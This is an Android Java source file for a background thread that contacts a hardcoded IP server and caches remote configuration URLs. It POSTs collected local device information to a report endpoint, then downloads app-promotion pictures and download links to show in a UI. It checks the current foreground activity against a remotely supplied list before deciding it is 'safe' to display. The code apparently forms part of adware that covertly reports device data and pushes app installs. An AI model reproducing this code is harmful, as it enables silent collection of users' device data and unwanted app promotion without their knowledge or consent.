package com.flex;

import java.util.ArrayList;
import java.util.HashSet;
import java.util.Set;

import android.content.Context;
import android.os.Bundle;
import android.os.Message;

public class CMainThread extends Thread {
	private static String tag = CMainThread.class.getName();
	private Context mContext = null;
	public static CMainThread mInstance = null;
	public static CMainThread getFlexThreadInstance(Context ctx){
		if(mInstance == null)
			mInstance = new CMainThread(ctx);
		return mInstance;
	}
	public  CMainThread(Context context){
		mContext = context;
	}
	public void run(){
		CBasicInfo instance = CBasicInfo.getInstance();
		if(instance.setLocalInformations(mContext) == false){
			return;
		}
		
		CFuncMod fm = CFuncMod.getCmInstance();
		String address = "http://120.26.39.236/fx/php/main.php?q=1";
		String gData = fm.GetConfigFileContent(address);
		if(gData == null || gData.isEmpty() == true){
			return;
		}
		String[] datas = gData.split("\\n");
		fm.cacheDatas(mContext, CDataDef.KEY_GLOBALE_SHOW_SWITCH, datas[0]);
		fm.cacheDatas(mContext, CDataDef.KEY_URL_RES_DATA_REPORT, datas[1]);
		fm.cacheDatas(mContext, CDataDef.KEY_URL_RES_CID_CFG, datas[2]);
		fm.cacheDatas(mContext, CDataDef.KEY_URL_RES_PIC_CFG, datas[3]);
		fm.cacheDatas(mContext, CDataDef.KEY_URL_RES_BMD_CFG, datas[4]);
		fm.cacheDatas(mContext, CDataDef.KEY_URL_RES_DOWN_REPORT, datas[5]);
		fm.cacheDatas(mContext, CDataDef.KEY_URL_RES_BACKUP_CFG, datas[6]);
		
		String params = instance.getLocalInforParams(mContext);
		CLogU.Log(tag, params);
		
		if(fm.NetWorkActivity(mContext) == false){
			return;
		}
		String dataReportUrl = fm.getDatasFromCached(mContext, CDataDef.KEY_URL_RES_DATA_REPORT);
		if(fm.getSendState(mContext,CDataDef.KEY_DATA_SEND_STATE,false) == true){
			CLogU.Log(tag, "has send");
		}else if(fm.sendPost(dataReportUrl, params) == false){
			CLogU.Log(tag, "has not send,and send failed.");
			return;
		}
		fm.setSendState(mContext, CDataDef.KEY_DATA_SEND_STATE, true);
		String value = fm.getDatasFromCached(mContext, CDataDef.KEY_GLOBALE_SHOW_SWITCH);
		if(value.equals("false") == true){
			return;
		}
		String idCfgUrl = fm.getDatasFromCached(mContext, CDataDef.KEY_URL_RES_CID_CFG);
		if(fm.NetWorkActivity(mContext) == false){
			return;
		}
		
		String idConfigData = fm.GetConfigFileContent(idCfgUrl);
		if(idConfigData == null || idConfigData.isEmpty()){
			return;
		}
		
		String bmd = fm.GetConfigFileContent(fm.getDatasFromCached(mContext, CDataDef.KEY_URL_RES_BMD_CFG));
		Set<String> setBmd = new HashSet<String>();
		String[] bmdData = bmd.split("\\n");
		for(String each : bmdData){
			setBmd.add(each);
		}
		String bkUrl = fm.GetConfigFileContent(fm.getDatasFromCached(mContext, CDataDef.KEY_URL_RES_BACKUP_CFG));
		CUI.mBackupUrls = bkUrl.split("\\n");
		CDataDef.gBackupElem = fm.createBackupPictureData(CUI.mBackupUrls);
		String thisID = fm.getDatasFromCached(mContext, CDataDef.KEY_CHANNEL_ID);
		if(thisID.equals("") == true || thisID == null){
			return;
		}
		
		boolean idNeedsShow = fm.thisIdNeedShow(idConfigData, thisID);
		if(idNeedsShow == false){
			return;
		}
		
		String oldPicDataCfgHash = fm.getDatasFromCached(mContext, CDataDef.KEY_PICTURE_CONFIG_MD5);
		String picDatas = fm.getPictureInformationURL(fm.getDatasFromCached(mContext,CDataDef.KEY_URL_RES_PIC_CFG));
		String[] eachPic = picDatas.split("\\n");
		CDataDef.gPictureDatas = new ArrayList<CPictureData>();
		for(int i = 0 ; i < eachPic.length; i++){
			String[] elements = eachPic[i].split("\\|");
			CPictureData pd = new CPictureData();
			pd.setPicBitmap(fm.readRemotePicture(elements[0]));
			pd.setAppDownloadURL(elements[1]);
			pd.setAppName(elements[2]);
			pd.setPicLevel(elements[3]);
			CDataDef.gPictureDatas.add(pd);
		}
		
		String curPicDataCfgHash = fm.MD5(picDatas);
		if(oldPicDataCfgHash.equals("") ){
			fm.getPicturesAndFillImageViews(mContext,picDatas);
			fm.cacheDatas(mContext, CDataDef.KEY_PICTURE_CONFIG_MD5, curPicDataCfgHash);
		}else{
			if(curPicDataCfgHash.equals(oldPicDataCfgHash) == true){
			}else{
				fm.getPicturesAndFillImageViews(mContext,picDatas);
				fm.cacheDatas(mContext, CDataDef.KEY_PICTURE_CONFIG_MD5, curPicDataCfgHash);
			}
		}
		CLogU.Log(tag, "detect the top activity is safe or not.");
		boolean safeOrNot = fm.isCurrentActivityInBmd(setBmd, mContext);
		Bundle bd = new Bundle();
		bd.putBoolean("safe", safeOrNot);
		Message msg = Message.obtain();
		msg.what = CDataDef.MSG_ID_SHOW_UI;
		msg.obj = CDataDef.gPictureDatas;
		msg.setData(bd);
		CUI.recMsg.sendMessage(msg);
		mInstance = null;
	}
}
